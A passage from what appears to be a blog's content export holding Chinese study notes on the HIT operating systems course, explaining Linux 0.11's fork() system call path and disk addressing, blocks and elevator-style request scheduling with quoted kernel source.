class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里调用了<code>fork()</code>函数，但是<code>fork()</code>具体长什么样，将上面的宏展开也就得出了答案</p><p><code>_syscall0(type,name)</code>的宏定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux-0.11/include/unistd.h</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _syscall0(type,name) \</span></span><br><span class="line"><span class="meta">type name(void) \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">long __res; \</span></span><br><span class="line"><span class="meta">__asm__ volatile (<span class="string">&quot;int $0x80&quot;</span> \</span></span><br><span class="line"><span class="meta">: <span class="string">&quot;=a&quot;</span> (__res) \</span></span><br><span class="line"><span class="meta">: <span class="string">&quot;0&quot;</span> (__NR_##name)); \</span></span><br><span class="line"><span class="meta"><span class="keyword">if</span> (__res &gt;= 0) \</span></span><br><span class="line"><span class="meta">return (type) __res; \</span></span><br><span class="line"><span class="meta">errno = -__res; \</span></span><br><span class="line"><span class="meta">return -1; \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>简单代入一下，<code>fork()</code>这个系统调用函数也就长这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> __res;</span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;int $0x80&quot;</span></span></span><br><span class="line"><span class="params">        : <span class="string">&quot;=a&quot;</span> (__res)</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;0&quot;</span> (__NR_fork)</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="keyword">if</span> (__res &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) __res;</span><br><span class="line">    errno = -__res;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心就是用了<code>int 0x80</code>中断，传入<code>__NR_fork</code>作为参数，并将结果通过<code>eax</code>寄存器传给变量<code>__res</code></p><p><code>int 0x80</code>中断会去调用<code>system_call</code>函数，但是在这之前还有更重要但是容易忽略的过程——<strong>保护现场</strong>。这个过程由<code>CPU</code>硬件自动完成，不需要我们操心，它所保存的变量在后面会有大用，下面来详细说说这个过程。</p><p>每个进程在被创建时，都会创建一个<code>TSS</code>和一个<code>内核栈</code>在内存当中，<code>TSS</code>中会有变量<code>es0</code>和<code>ss0</code>指向这个<code>内核栈</code>。触发中断时，<code>CPU</code>会根据<code>TR</code>寄存器在<code>GDT</code>表中找到<code>TSS段描述符</code>，然后根据这个段描述符找到当前进程的<code>TSS</code>。<code>CPU</code>会在<code>TSS</code>中在相应位置检索出<code>esp0</code>和<code>ss0</code>，找到其指向的内核栈，接下来做的就是<strong>保护现场</strong>，将<code>ss</code>、<code>esp</code>、<code>EFLAGS</code>、<code>cs</code>、<code>eip</code>这五个寄存器的值一次存入内核栈中，然后修改<code>ss:esp</code>为当前内核栈。由此，不仅在内核栈当中保存了用户栈的地址，还将栈从用户栈切换到内核栈。接下来，<code>int 0x80</code>就会跳转到<code>system_call</code>这个内核函数。正式进入了<strong>内核态</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">; linux-0.11/kernel/system_call.s</span><br><span class="line"></span><br><span class="line">_system_call:</span><br><span class="line">push ds, es, fs</span><br><span class="line">pushl edx, ecx, ebx</span><br><span class="line">call _sys_fork</span><br><span class="line">pushl eax</span><br><span class="line"></span><br><span class="line">; 调度函数</span><br><span class="line">movl _current, eax</span><br><span class="line">cmpl $0, state(eax)</span><br><span class="line">jne reschedule</span><br><span class="line">cmpl $0, counter(eax)</span><br><span class="line">je reschedule</span><br><span class="line"></span><br><span class="line">ret_from_sys_call:</span><br><span class="line">; ...</span><br><span class="line">popl eax</span><br><span class="line">popl ebx, ecx, edx</span><br><span class="line">pop fs, es, ds</span><br><span class="line">iret</span><br><span class="line"></span><br><span class="line">_sys_fork:</span><br><span class="line">; ...</span><br><span class="line">push gs</span><br><span class="line">push esi, edi, ebp, eax</span><br><span class="line">call _copy_process</span><br><span class="line">addl $20, esp ; 这一步很妙，用加法相当于弹出了20个寄存器</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>从上面可知，<code>_system_call</code>跳转到<code>_sys_fork</code>后又马上调用了<code>_copy_process</code>这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux-0.11/kernel/fork.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">copy_process</span><span class="params">(<span class="type">int</span> nr,<span class="type">long</span> ebp,<span class="type">long</span> edi,<span class="type">long</span> esi,<span class="type">long</span> gs,<span class="type">long</span> none,</span></span><br><span class="line"><span class="params"><span class="type">long</span> ebx,<span class="type">long</span> ecx,<span class="type">long</span> edx,</span></span><br><span class="line"><span class="params"><span class="type">long</span> fs,<span class="type">long</span> es,<span class="type">long</span> ds,</span></span><br><span class="line"><span class="params"><span class="type">long</span> eip,<span class="type">long</span> cs,<span class="type">long</span> eflags,<span class="type">long</span> esp,<span class="type">long</span> ss)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>* <span class="title">p</span>;</span></span><br><span class="line">    <span class="comment">/* .. */</span></span><br><span class="line">    p = (<span class="keyword">struct</span> task_struct*)get_free_page(); <span class="comment">// 申请了一个Page，然后以task_struct的方式对待它，剩下的内存拿来当内核栈了</span></span><br><span class="line">    <span class="keyword">if</span> (!p)</span><br><span class="line">        <span class="keyword">return</span> -EAGAIN;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// tss指向子进程内核栈</span></span><br><span class="line">    p-&gt;tss.esp0 = PAGE_SIZE + (<span class="type">long</span>)p;</span><br><span class="line">    p-&gt;tss.ss0 = <span class="number">0x10</span>; <span class="comment">// 内核数据段</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// tss设置用户栈(与父进程共用)</span></span><br><span class="line">    p-&gt;tss.esp = esp;</span><br><span class="line">    p-&gt;tss.ss = ss &amp; <span class="number">0xffff</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    </span><br><span class="line">    p-&gt;tss.ip = ip;</span><br><span class="line">    p-&gt;tss.cs = cs &amp; <span class="number">0xffff</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    </span><br><span class="line">    p-&gt;tss.ecx = ecx;</span><br><span class="line">    p-&gt;tss.eax = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 内存操作... */</span></span><br><span class="line">    </span><br><span class="line">    p-&gt;state = TASK_RUNNING;</span><br><span class="line">    <span class="keyword">return</span> last_pid; <span class="comment">// 返回子进程的pid</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// p-&gt;tss作为任务状态段,其实任务状态寄存器TR指向的地方就是这里,就是get_free_page()得到的地址</span></span><br></pre></td></tr></table></figure><p>这个函数需要一堆参数，从哪来呢。回顾一下，在调用<code>_sys_fork</code>之前，我们 push 了一堆寄存器，包括还原现场时保存的寄存器，这些都是当前父进程的状态，作为这个函数的参数。这个函数具体做的就是为子进程申请一块空间，然后把里面的父进程的当前的状态(所有寄存器的值)拷贝给子进程<code>TSS</code>，这样子进程与父进程的状态大体一致，指向的用户栈也是同一个。但是后来子进程又做了一些自定义操作，比如把<code>eax</code>置为 0，用来当作<code>fork()</code>函数的返回值。<strong>在这个过程中，感觉老师上课讲的什么子进程内核栈拷贝父进程的内核栈可能是错的说法，正确说法应该是，子进程的<code>TSS</code>以父进程的内核栈为媒介拷贝父进程在用户态时的<code>TSS</code>。此时子进程的内核栈应该是空的，而且子进程起手就是在用户态运行。</strong>（后记：这段代码是原先linux0.11根据TSS做进程切换需要而创建进程的方式，但是后来老师提出的切换内核栈做到进程切换的方式不再这样做，而是通过<code>*(--kernstack) = register</code>方式做内核栈的<code>push</code>，所以老师说的其实是对的。</p><blockquote><p>在C语言中，函数参数是从右往左依次入栈的，换句话说右边的参数所在地址会高一点</p></blockquote><p>在这个函数前面申请内存那块，如果申请失败了，子进程创建失败，那么返回<code>-EAGAIN</code>放在<code>eax</code>中，这个值定义在<code>linux-0.11/include/errno.h</code>中<code>#define EAGAIN    11</code>，可见是个负值。</p><p><code>_sys_fork</code>执行好了之后，就会执行下面的调度函数。如果前面子进程创建成功，调度函数会把当前进程调度为子进程，此时<code>eax</code>存储的是 0；如果创建失败，调度函数仍然调度父进程，此时<code>eax</code>存储 -11。最后<code>eax</code>的值会保存在<code>fork()</code>函数中的<code>__res</code>变量中用作返回值</p><p>这样，回到原来<code>if(!fork())</code>进行判断时，就能根据返回的结果决定走<code>if</code>里的语句作为子进程，还是跳过继续执行父进程。</p><p>将<code>_sys_fork</code>函数的作用概括一下：</p><p>将当前父进程所有寄存器的值入栈，作为函数参数赋值给创建的子进程的<code>TSS</code>，注意这个创建的子进程还没立刻执行，它只不过是先被创建了放在那，只有在进程调度后才会被执行，虽然父进程和子进程谁先被调度不知道但总归是会被执行的。在<code>copy_process()</code>中时，<code>CPU</code>仍然还在为父进程服务。</p><p>在进入<code>copy_process()</code>前，父进程的内核栈的<code>cs:ip</code>指向的是<code>fork()</code>函数中的指令，大致应该是<code>mov [__res], eax</code>。而区分父进程还是父进程的关键点就在这。</p><p>对于父进程来说，<code>CPU</code>在执行<code>copy_process()</code>函数时服务的进程还是父进程，这个函数执行完后会<code>return last_pid</code>即将子进程的<code>pid</code>存入<code>eax</code>中。而父进程退出内核态返回用户态时执行的第一条指令就是<code>mov [__res], eax</code>，这就使得<code>fork()</code>的返回值是子进程的<code>pid</code>。</p><p>当然了，如果子进程创建失败了，<code>eax</code>里存的就是一个负值，<code>fork()</code>的返回值也变成负值</p><p>对于子进程来说，<code>CPU</code>在父进程中执行<code>copy_process()</code>函数时，就将子进程的<code>eax</code>强制修改为了<code>0</code>，在调度到子进程执行时，因为子进程<code>TSS</code>里的<code>cs:ip</code>是父进程很早就压栈进来的，子进程的第一条指令就是<code>mov [__res], eax</code>这一条在用户态的代码，所以此时<code>fork()</code>的返回值就是<code>0</code></p><p>完。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【哈工大操作系统】磁盘操作原理</title>
      <link href="/2024/05/12/%E3%80%90%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%91%E7%A3%81%E7%9B%98%E6%93%8D%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
      <url>/2024/05/12/%E3%80%90%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%91%E7%A3%81%E7%9B%98%E6%93%8D%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>磁盘，也就是机械硬盘。由多个盘面以及对应的磁头组成，盘面负责存储数据，磁头负责读写数据。</p><p>为了更好的管理存储空间，将盘面的细节抠出来。一个盘面被分成若干同心圆环的<strong>磁道</strong>，每个磁道被分为若干<strong>扇区</strong>。扇区就是磁盘读写的基本单位，每次读写都是操控一个扇区，一个扇区大小为<strong>512字节</strong>。扇区不能太大也不能太小，太大了造成存储碎片的浪费，太小了影响读写时间（因为磁头的移动很浪费时间</p><p>一次磁盘的读写分为三步：</p><ol><li>寻道，移动磁头</li><li>旋转，旋转盘面</li><li>数据传输，电磁信号的转化</li></ol><p>为了更好的定位，磁盘控制器通过三个参数来操控磁盘：</p><ol><li><strong>柱面(cyl)</strong>，从盘片的圆心出发，所有盘片上相等半径的磁道（圆环）在垂直方向上形成一个圆柱体，这就是一个柱面。从整体来看，所有柱面由里到外依次嵌套。移动磁头就是为了定位柱面</li><li><strong>磁头(head)</strong>，有了柱面之后要读取柱面上的哪个盘面呢？这就由磁头来定位</li><li><strong>扇区(sec)</strong>，盘面上的每个磁道上的每个扇区都有相应的编号，通过这个编号来旋转盘面就可定位到相应的扇区</li></ol><p>除了上面三个参数，还需要给磁盘控制器发送另外一个参数<strong>缓存位置</strong>，告诉磁盘具体读写到内存的哪一块地方</p><p>因为是直接跟跟硬件打交道了，操作系统这一块的代码都是由汇编写的，比如说往特定端口传送一个数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux0.11/include/io.h */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> outb(value,port) \</span></span><br><span class="line"><span class="meta">__asm__ (<span class="string">&quot;outb %%al,%%dx&quot;</span>::<span class="string">&quot;a&quot;</span> (value),<span class="string">&quot;d&quot;</span> (port))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> outb_p(value,port) \</span></span><br><span class="line"><span class="meta">__asm__ (<span class="string">&quot;outb %%al,%%dx\n&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\tjmp 1f\n&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;1:\tjmp 1f\n&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;1:&quot;</span>::<span class="string">&quot;a&quot;</span> (value),<span class="string">&quot;d&quot;</span> (port))</span></span><br></pre></td></tr></table></figure><p>向磁盘发送命令和数据需要连续的调用<code>outb</code>函数给连续的几个端口（具体是7个）传递数据</p><p>在<code>linux0.11</code>中大体上由下面两个函数构成了一个磁盘驱动</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux0.11/kernel/blk_drv/hd.c */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_hd_request</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...hd_out(dev, nsect, sec, head, cyl, WIN_WRITE, &amp;read_intr);</span><br><span class="line">    port_write(HD_DATA,CURRENT-&gt;buffer,<span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hd_out</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> drive,<span class="type">unsigned</span> <span class="type">int</span> nsect,<span class="type">unsigned</span> <span class="type">int</span> sect,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> head,<span class="type">unsigned</span> <span class="type">int</span> cyl,<span class="type">unsigned</span> <span class="type">int</span> cmd,</span></span><br><span class="line"><span class="params"><span class="type">void</span> (*intr_addr)(<span class="type">void</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">port=HD_DATA; <span class="comment">/* 数据寄存器端口(0x1f0) */</span></span><br><span class="line">outb_p(hd_info[drive].wpcom&gt;&gt;<span class="number">2</span>,++port);</span><br><span class="line">outb_p(nsect,++port);</span><br><span class="line">outb_p(sect,++port);</span><br><span class="line">outb_p(cyl,++port);</span><br><span class="line">outb_p(cyl&gt;&gt;<span class="number">8</span>,++port);</span><br><span class="line">outb_p(<span class="number">0xA0</span>|(drive&lt;&lt;<span class="number">4</span>)|head,++port);</span><br><span class="line">outb(cmd,++port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>do_hd_request()</code>函数负责接收传输请求，计算参数，传递参数调用<code>hd_out</code>。<code>hd_out()</code>函数负责接收参数，用<code>outb</code>向端口发送数据</p><p>磁盘控制器通过三个参数，三维编址的方式来定位扇区。<code>Linux</code>为了简化接口，将磁盘上的扇区进行统一编址，将三维编址转为了一维编址。</p><p>具体是怎么编址的呢。从0号盘面的0号磁道上的0号扇区开始编址为0，然后沿着磁道逐步递增，将当前磁道填满。转了一圈后，磁头又回到了原位，此时下一个编址的扇区不是当前盘面的下一磁道，因为这会导致磁头的移到造成时间上的浪费。这时可以将下一个编址扇区定位在下一个盘面上同一柱面上的磁道，这样子读取下一个扇区连磁头都不需要移动了。</p><p>所以整体的编址思路就是先将<strong>柱面</strong>填满，再填满定位扇区上面的<strong>磁道</strong>，再定位<strong>扇区</strong></p><p>于是一个扇区的编址便有了具体的计算公式：<code>C * (Heads * Sectors) + H * Sectors + S</code></p><p>其中<code>Heads</code>和<code>Sectors</code>对应一个磁盘的磁头数和一个磁道上的扇区数。这是一个磁盘的固定参数。</p><p>磁盘驱动的一个大作用就是翻译一个用户传递的扇区编址，将其转为三个定位参数</p><p>为了提高传输效率，<code>Linux</code>提出了**盘块(block)**的概念，其实也没什么，就是将连续的几个扇区定义为一个盘块，对上层的用户提供的接口也是以盘块为单位，这样对用户来说读写的基本单位就是一个盘块，但是对硬件来说读写的基本单位仍然是扇区。那么为什么提出这个概念呢？</p><p><code>磁盘访问时间 = 写入控制器时间 + 寻道时间 + 旋转时间 + 传输时间</code></p><p>其中，占据主要因素的是<strong>寻道时间</strong>和<strong>寻转时间</strong></p><p>如果，此时计算机有很多的进程正在运行，每个进程都会涉及磁盘的访问。每个进程所要访问磁盘的地址可能会是非常离散的，又因为进程的调度缘故，使得磁盘每次读写时都会让磁头移来移去，这在目前阶段来说是无法避免的。但是如果让磁盘在每次移动后都多读写几个扇区，这样的话单位时间内传输的数据不久增加了吗。每次多读几个扇区就对应于读一个盘块。比如在没有盘块前，读写速率为<code>100K/秒</code>，有了盘块后，每次读写速率就变成了<code>40M/秒</code>。这就是盘块的原因。</p><p>但是盘块的大小不能太大，因为每次的读写单位是一个盘块，如果盘块太大就会造化过大的存储碎片，空间利用率就下降了。</p><p>因为<code>Linux</code>采用了盘块，所以上面的公式就变成了<code>block = C * (Heads * Sectors) + H * Sectors + S</code>，在作用于具体的扇区时只要将<code>block * nsect</code>就可以得到一维编址的扇区号，<code>nsect</code>是一个盘块有多少个扇区</p><p>那么<code>linux0.11</code>的盘块是多大呢，在<code>make_request()</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux0.11/kernel/blk_drv/hd.c */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">make_request</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">request</span>* <span class="title">req</span>;</span></span><br><span class="line">    req = request + NR_REQUEST;</span><br><span class="line">    req-&gt;sector = bh-&gt;b_blocknr &lt;&lt; <span class="number">1</span>; <span class="comment">/* 这里可以看出盘块的大小是2个扇区 */</span></span><br><span class="line">    add_reqeuest(major + blk_dev, req);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数应该是操作系统提供给用户的接口，让用户能够发出访问磁盘的申请。磁盘驱动的作用就是从请求队列中取出进程发出的请求，解析请求，发出<code>outb</code>指令。</p><p>多个进程使用磁盘肯定要进行管理，这就需要<strong>请求队列</strong>。磁盘每次完成任务后就会发出中断，<code>CPU</code>每执行完一条指令就会检查中断，然后应该是去执行磁盘驱动程序，磁盘驱动程序就会处理请求队列中的请求。所以如何维护这个请求队列就是接下来要讲的<strong>调度算法</strong>。需要注意的是这里的队列说是队列，但在具体处理的时候并不遵循先进先出。</p><p>一开始想到的算法就是<strong>先来先服务算法(FCFS)</strong>，这个算法最简单最公平，但是缺点也很明显，因为毫无规律，磁头跟没头苍蝇一样移来移去，造成时间上的严重浪费</p><p>在FCFS算法的基础上，可以在一个节点跳到另一个节点的过程中将中间节点处理掉，于是有了<strong>短寻道优先算法(Shortest-seek-time First)</strong>。这个算法比起上一个算法大大减少了磁头移动的次数。但是仍然有个大缺点就是，从概率上来说，节点出现在中间的概率会非常大，而进程是源源不断得发出请求，这就造成驱动程序可能会一直服务中间节点，无法顾及两端节点，造成饥饿。</p><p>在短寻道优先算法(SSTF)的基础上继续改进，有了<strong>扫描调度算法(SCAN)</strong>。SSTF+中途不回折：每个请求都有处理机会。这个算法的思路就是，先不管离得近的高节点，先处理离的近的低节点，然后慢慢往0节点靠；到了0节点**（不管0节点有没有请求，都要到0节点才行，这是规定）<strong>后再处理离得最近的高节点，然后慢慢往最高节点靠，到了最高节点</strong>（不管最高节点有没有请求，都要到最高节点才行，这是规定）**后再往离得近点低节点靠。如此循环往复，就跟电梯一样。但是这个算法仍有缺点，如果在算法处理的过程中，中间突然有节点突然插进来，那么算法就会优先处理这个插进来的节点，中间的请求还是占便宜了。总结来说，这个算法就是没有回头路，在到达指定节点前不会回头。</p><p>题外篇，<strong>LOOK算法</strong>，没什么好说的，就是扫描调度算法去掉了必须到达0节点和最高节点才能掉头的规定。如果已经到达申请的最低节点或者最高节点就可以掉头了。</p><p>最终有了<strong>电梯算法(C-SCAN)</strong>，跟上面的思路差不多。慢慢先往0节点靠，但是到达最低节点后不是先处理离得最近的高节点，而是直接移动到最高节点，先处理最高节点，然后在往最低节点靠的过程中处理中间节点；在往高节点靠的过程也是这样，到达最高节点后直接移动到0节点，如此循环。这样先处理两端再解决中间的算法就是所谓的电梯算法。此外，因为磁头从最低点复位到最高点这样命令的执行是很快的，所以还是很好的。这个算法是基于扫描调度算法的不是LOOK算法，所以规定了必须走到0节点或者最高节点。</p><p>然后就是<strong>C-LOOK算法</strong>，没什么好说的，就是基于电梯算法去掉了必须到达0节点和最高节点才能掉头的规定。</p><p>这个算法的具体实现就放在<code>add_request()</code>函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux0.11/kernel/blk_drv/hd.c */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">make_request</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    req-&gt;sector = bh-&gt;b_blocknr &lt;&lt; <span class="number">1</span>; <span class="comment">/* 这里可以看出盘块的大小是2个扇区 */</span></span><br><span class="line">    add_reqeuest(major + blk_dev, req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">add_request</span><span class="params">(<span class="keyword">struct</span> blk_dev_struct * dev, <span class="keyword">struct</span> request * req)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> * <span class="title">tmp</span> =</span> dev-&gt;current_request;</span><br><span class="line">req-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">cli();</span><br><span class="line"><span class="keyword">for</span> ( ; tmp-&gt;next ; tmp=tmp-&gt;next)</span><br><span class="line"><span class="keyword">if</span> ( (IN_ORDER(tmp,req) || !IN_ORDER(tmp,tmp-&gt;next) ) &amp;&amp;</span><br><span class="line">    IN_ORDER(req,tmp-&gt;next))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">req-&gt;next=tmp-&gt;next;</span><br><span class="line">tmp-&gt;next=req;</span><br><span class="line">sti();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* linux0.11/kernel/blk_drv/blk.h */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IN_ORDER(s1,s2) \</span></span><br><span class="line"><span class="meta">(((s1)-&gt;dev <span class="string">&lt; (s2)-&gt;</span>dev || ((s1)-&gt;dev == (s2)-&gt;dev &amp;&amp; \</span></span><br><span class="line"><span class="meta">(s1)-&gt;sector <span class="string">&lt; (s2)-&gt;</span>sector)))</span></span><br></pre></td></tr></table></figure><p><code>add_request()</code>函数将进程发出的请求放在一个全局变量——<code>request</code>队列中。因为这个变量是全局共享的，所以在操作的时候需要关中断（互斥），因为进程的执行依赖进程的时间片，进程时间片的减少由<strong>时间中断</strong>引起，关了中断后，时间中断不会执行，进程的时间片不会减少，进程的时间片不减少到0，也就不会触发进程的调度。或者说因为时间中断不会触发，中断中因为时间片减少为0触发调度算法的带啊吗也就不会执行。</p><p>这个<code>IN_ORDER(s1, s2)</code>比较出来的结果是<code>s1 &lt; s2</code>，比较的是<code>sector</code>的大小，<code>sector = C * (Heads * Sectors) + H * Sectors + S</code>，其实真正比较的是<code>C</code>也就是柱面号的大小</p><p><code>(tmp &lt; req || next &lt;= tmp) &amp;&amp; req &lt; next</code></p><p>可以转变成下面两个条件</p><p><code>tmp &lt; req &amp;&amp; req &lt; next</code></p><p><code>next &lt;= tmp &amp;&amp; req &lt; next</code></p><p>最后的结果变成</p><p><code>tmp -&gt; req -&gt; next</code></p><p>在<code>linux0.11</code>中的电梯算法与老师描述的不太一样，就是方向不太一样。它是从中间先往高节点慢慢靠，再一下子去到最低节点</p><p>第一个条件是很正常，由低节点慢慢向高节点靠的过程中插入<code>req</code></p><p>第二个条件就是，当<code>tmp</code>处于最高节点时，而<code>next</code>处于最低节点时，而且<code>req</code>还比<code>next</code>低，此时应该把最低节点替换为<code>req</code>，让磁头直接从<code>tmp</code>移到<code>req</code>，然后<code>req</code>的下一个目标是<code>next</code>。</p><p>最后一种情况应该是上面的条件都不成立，正常跳出<code>for</code>循环时，<code>req</code>应该是最高节点，这时并不让<code>req</code>直接插入队列代替原来的最高点，而是让<code>req</code>接上队列的末尾。</p><p>好的，接下来引入文件的概念</p><p>上面讲的是<code>Linux</code>对磁盘的两层抽象，第一层抽象：将三维编址变成一维编址，有了统一编址；第二层抽象：将多个扇区定义为盘块，之后对磁盘的使用就是通过盘块号。上面两层抽象叫做 <strong>Row Disk 